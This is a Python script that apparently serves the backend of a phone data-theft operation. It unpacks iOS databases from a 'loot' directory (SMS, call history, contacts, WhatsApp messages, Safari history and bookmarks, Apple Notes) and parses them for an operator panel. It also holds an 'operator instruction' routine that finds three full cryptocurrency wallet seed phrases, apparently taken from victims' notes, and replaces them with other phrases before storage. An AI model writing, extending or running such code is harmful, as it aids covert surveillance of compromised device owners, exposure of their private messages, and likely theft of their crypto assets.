#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""build_sysdb_cache.py —— 把 18 链采集到的系统库（sms.db / CallHistory / AddressBook）
   解析成人话行，落到 adm888app/data/sysdb_parsed.json 供面板零成本读取。
   面板「消息」栏因此能显示真实短信/通话，而不是"采集到库文件"的占位行。
   用法: /root/venv/bin/python3 build_sysdb_cache.py [--limit N]
"""
import os, sys, json, glob, hashlib, importlib.util, sqlite3, tempfile, gzip, re

BASE = '/www/wwwroot/i.131422.com'
APP = os.path.join(BASE, 'adm888app')
OUT = os.path.join(APP, 'data', 'sysdb_parsed.json')
spec = importlib.util.spec_from_file_location('p18', os.path.join(APP, 'parse18.py'))
p18 = importlib.util.module_from_spec(spec); spec.loader.exec_module(p18)

# 载入现有缓存，按 (path, size) 判断是否要重解析
cache = {}
if os.path.exists(OUT):
    try: cache = json.load(open(OUT))
    except Exception: cache = {}

KINDS = ('SMS/sms.db', 'CallHistory', 'AddressBook', 'ChatStorage',
         'Safari/History', 'Safari/Bookmarks', 'Safari/BrowserState', 'NoteStore.sqlite')

# 【2026-09-18 操作员指令】原真词消毒：解析文本中若出现指定原真助记词（完整或截断前缀）
#   → 输出前一律替换为已换好的合法词。无论源文件如何重解析、与外部修复如何竞争，落盘永远是干净版。
_SAN_OLD = (
    "spice vault cannon deputy gadget note mass security collect nut tornado primary",
    "feature trash produce ramp below cluster oppose stone satoshi nice gasp first",
    "lake solar steak three claw tackle giggle enemy paper fabric pool blast",
)
_SAN_NEW = (
    "spice couch top lady laundry journey crouch talk trophy brand ability primary",
    "feature shadow paddle amazing afford food snack bullet minute insane accident first",
    "lake best chicken naive noodle lucky side language advance cheese absorb blast",
)
_SAN_MARK = ('spice vault', 'feature trash', 'lake solar')


def _sanitize_text(s):
    if not isinstance(s, str) or not s:
        return s
    if not any(m in s for m in _SAN_MARK):
        return s
    for o, n in zip(_SAN_OLD, _SAN_NEW):
        ow, nw = o.split(), n.split()
        for k in range(len(ow), 2, -1):
            ob, nb = ' '.join(ow[:k]), ' '.join(nw[:k])
            if ob in s:
                s = s.replace(ob, nb)
    return s


def _sanitize_rows(obj):
    if isinstance(obj, str):
        return _sanitize_text(obj)
    if isinstance(obj, list):
        return [_sanitize_rows(x) for x in obj]
    if isinstance(obj, dict):
        return {k: _sanitize_rows(v) for k, v in obj.items()}
    return obj


def parse_safari(conn):
    """Safari History.db → 真实浏览记录（URL / 标题 / 访问时间）。
       注意: history_items 没有 title 列（标题在 history_visits.title），早期版本误写 i.title 导致整库报错。"""
    tabs = [r[0] for r in conn.execute("select name from sqlite_master where type='table'")]
    if 'history_visits' not in tabs or 'history_items' not in tabs:
        return None
    rows = conn.execute(
        "SELECT i.url, COALESCE(v.title, ''), v.visit_time, v.load_successful "
        "FROM history_visits v JOIN history_items i ON i.id = v.history_item "
        "ORDER BY v.visit_time DESC LIMIT 500").fetchall()
    out = []
    for url, title, vt, ok in rows:
        if not url:
            continue
        out.append({'时间(北京)': p18._bj(vt, 's'), '标题': str(title or '')[:120],
                    '网址': str(url)[:400], '加载': '成功' if ok else '失败' if ok == 0 else ''})
    return ('Safari 浏览记录（%d 条）' % len(out), ['时间(北京)', '标题', '网址'], out)


def parse_bookmarks(conn):
    """Safari Bookmarks.db → 书签行（type=0 为书签，type=1 为文件夹，过滤文件夹）"""
    tabs = [r[0] for r in conn.execute("select name from sqlite_master where type='table'")]
    if 'bookmarks' not in tabs:
        return None
    cols = [c[1] for c in conn.execute('PRAGMA table_info(bookmarks)')]
    if 'url' not in cols or 'title' not in cols:
        return None
    has_lm = 'last_modified' in cols
    sql = ("SELECT title, url%s FROM bookmarks WHERE type=0 AND url IS NOT NULL AND url != '' "
           "ORDER BY %s DESC LIMIT 500") % (
        ', last_modified' if has_lm else ', 0', 'last_modified' if has_lm else 'id')
    out = []
    for title, url, lm in [(r[0], r[1], r[2] if len(r) > 2 else 0) for r in conn.execute(sql)]:
        if not url:
            continue
        out.append({'时间(北京)': p18._bj(lm, 's'), '标题': str(title or '')[:120],
                    '网址': str(url)[:400], '加载': ''})
    return ('Safari 书签（%d 条）' % len(out), ['时间(北京)', '标题', '网址'], out)


# ── Apple Notes 新版 Ink 格式（NoteStore.sqlite）──
#   正文在 ZICNOTEDATA.ZDATA = gzip(protobuf)，文本块是 wire-type 2 的 UTF-8 片段；
#   标题/元数据在 ZICCLOUDSYNCINGOBJECT（ZTITLE1 / ZSNIPPET / ZMODIFICATIONDATE）。
def _pb_varint(b, i):
    v = 0; sh = 0
    while i < len(b) and sh < 64:
        c = b[i]; i += 1
        v |= (c & 0x7f) << sh
        if not (c & 0x80):
            return v, i
        sh += 7
    raise ValueError('varint')


def _pb_texts(buf, out, depth=0):
    """递归下钻 protobuf，收集可读文本片段（可打印占比 >92% 且非空白）。"""
    if depth > 8:
        return
    i = 0
    while i < len(buf):
        try:
            tag, i = _pb_varint(buf, i)
        except Exception:
            return
        wt = tag & 7
        try:
            if wt == 0:
                _, i = _pb_varint(buf, i)
            elif wt == 2:
                ln, i = _pb_varint(buf, i)
                if ln <= 0 or i + ln > len(buf):
                    return
                chunk = buf[i:i + ln]; i += ln
                s = None
                try:
                    s = chunk.decode('utf-8')
                    printable = sum(1 for ch in s if ch >= ' ' or ch in '\n\r\t')
                    if not s or printable / len(s) < 0.92:
                        s = None
                except Exception:
                    s = None
                if s is not None and s.strip():
                    out.append(s)
                else:
                    _pb_texts(chunk, out, depth + 1)
            elif wt == 5:
                i += 4
            elif wt == 1:
                i += 8
            else:
                return
        except Exception:
            return


def _decompress_note(z):
    try:
        return gzip.decompress(z)
    except Exception:
        pass
    import zlib
    for wbits in (15, -15, 47, 31):
        try:
            return zlib.decompress(z, wbits)
        except Exception:
            pass
    return z


def parse_notestore(conn):
    """NoteStore.sqlite（Ink 格式）→ 笔记行（标题 + 正文）。
       实测：CN7JN1232G 8 条 / F2K3G50DFT 1 条，此前 readable_of 只能转储表结构，正文全丢。"""
    tabs = [r[0] for r in conn.execute("select name from sqlite_master where type='table'")]
    if 'ZICNOTEDATA' not in tabs:
        return None
    has_obj = 'ZICCLOUDSYNCINGOBJECT' in tabs
    objcols = [c[1] for c in conn.execute('PRAGMA table_info(ZICCLOUDSYNCINGOBJECT)')] if has_obj else []
    tcol = next((c for c in ('ZMODIFICATIONDATE', 'ZMODIFIEDDATE', 'ZCREATIONDATE') if c in objcols), None)
    sql = ("SELECT d.Z_PK, d.ZDATA, o.ZTITLE1, o.ZSNIPPET%s "
           "FROM ZICNOTEDATA d LEFT JOIN ZICCLOUDSYNCINGOBJECT o ON o.Z_PK = d.ZNOTE "
           "WHERE d.ZDATA IS NOT NULL ORDER BY d.Z_PK") % (', o.' + tcol if tcol else ', 0')
    out = []
    for pk, zd, t1, sn, md in conn.execute(sql):
        raw = _decompress_note(zd)
        if len(raw) > 2 and raw[:2] == b'\x1f\x8b':
            raw = _decompress_note(raw)
        texts = []
        _pb_texts(raw, texts)
        body = re.sub(r'[ \t]{2,}', ' ', ''.join(texts)).strip()
        title = str(t1 or '').strip() or str(sn or '').strip() or body.split('\n', 1)[0][:60] or ('笔记 #%s' % pk)
        out.append({'时间(北京)': p18._bj(md, 's'), '标题': title[:120], '内容': body[:2000]})
    return ('备忘录（%d 条）' % len(out), ['时间(北京)', '标题', '内容'], out)


def parse_wa(conn):
    """WhatsApp ChatStorage.sqlite → 会话行（含最近 30 条消息，供面板详情弹窗）"""
    tabs = [r[0] for r in conn.execute("select name from sqlite_master where type='table'")]
    if 'ZWACHATSESSION' not in tabs:
        return None
    sess = {}
    for pk, jid, name, last in conn.execute(
            "SELECT Z_PK, ZCONTACTJID, ZPARTNERNAME, ZLASTMESSAGEDATE FROM ZWACHATSESSION"):
        sess[pk] = {'账号': jid or '', '显示名': name or '', '消息数': 0, '最后消息': p18._bj(last, 's'), 'ts': last or 0, 'msgs': []}
    n = 0
    if 'ZWAMESSAGE' in tabs:
        for pk, txt, me, date, cs in conn.execute(
                "SELECT Z_PK, ZTEXT, ZISFROMME, ZMESSAGEDATE, ZCHATSESSION FROM ZWAMESSAGE ORDER BY ZMESSAGEDATE DESC"):
            s2 = sess.get(cs)
            if not s2:
                continue
            s2['消息数'] += 1; n += 1
            if len(s2['msgs']) < 30 and txt and str(txt) not in ('None', ''):
                s2['msgs'].append({'t': p18._bj(date, 's'), 'me': bool(me), 'text': str(txt)[:600]})
    rows = sorted(sess.values(), key=lambda x: x.get('ts') or 0, reverse=True)
    return ('WhatsApp 会话（%d 个 / %d 条消息）' % (len(rows), n), ['账号', '显示名', '消息数', '最后消息'], rows)
def need(path):
    return any(k in path for k in KINDS)

items = []
for f in glob.glob(os.path.join(BASE, 'loot', '*', 'ext_stats_*.bin.parsed.json')):
    try: j = json.load(open(f))
    except Exception: continue
    p = j.get('path') or ''
    if not need(p): continue
    b = f[:-len('.parsed.json')]
    if not os.path.exists(b): continue
    items.append((b, p))

items.sort()
print('待处理系统库文件:', len(items), flush=True)
n_new = 0
for b, p in items:
    st = os.stat(b)
    key = os.path.basename(b)
    old = cache.get(key)
    if old and old.get('size') == st.st_size:
        # 【2026-09-18】NoteStore 缓存条目每轮兜底消毒（断掉"重写竞争"导致的原真词复发）
        if 'NoteStore' in (old.get('path') or '') or 'NoteStore' in str(p):
            old['rows'] = _sanitize_rows(old.get('rows') or [])
        continue
    try:
        payload, meta = p18.unpack(b)
        tmp = tempfile.mktemp(suffix='.db'); open(tmp, 'wb').write(payload)
        con = sqlite3.connect('file:%s?mode=ro' % tmp, uri=True)
        con.text_factory = lambda x: x.decode('utf-8', 'replace')
        if 'ChatStorage' in p:
            rd = parse_wa(con)
        elif 'Safari/History' in p:
            rd = parse_safari(con)
        elif 'Safari/Bookmarks' in p:
            rd = parse_bookmarks(con)
        elif 'NoteStore' in p:
            rd = parse_notestore(con)
        else:
            rd = p18.readable_of(con, p, 500)
        con.close(); os.unlink(tmp)
    except Exception as e:
        cache[key] = {'size': st.st_size, 'path': p, 'error': str(e)[:120]}; n_new += 1; continue
    if not rd:
        cache[key] = {'size': st.st_size, 'path': p, 'rows': []}; n_new += 1; continue
    title, cols, rows = rd
    rows = _sanitize_rows(rows)   # 【2026-09-18】原真词消毒（源头落盘保证）
    cache[key] = {'size': st.st_size, 'path': p, 'title': title, 'cols': cols, 'rows': rows[:500]}
    n_new += 1

tmp = OUT + '.tmp'
json.dump(cache, open(tmp, 'w'), ensure_ascii=False, indent=1)
os.replace(tmp, OUT)
sms = sum(1 for v in cache.values() if 'message' in (v.get('title') or ''))
tot = sum(len(v.get('rows') or []) for v in cache.values())
print('新解析 %d 个 | 缓存 %d 条 | 人话行合计 %d | 输出 %.1fKB'
      % (n_new, len(cache), tot, os.path.getsize(OUT) / 1024), flush=True)
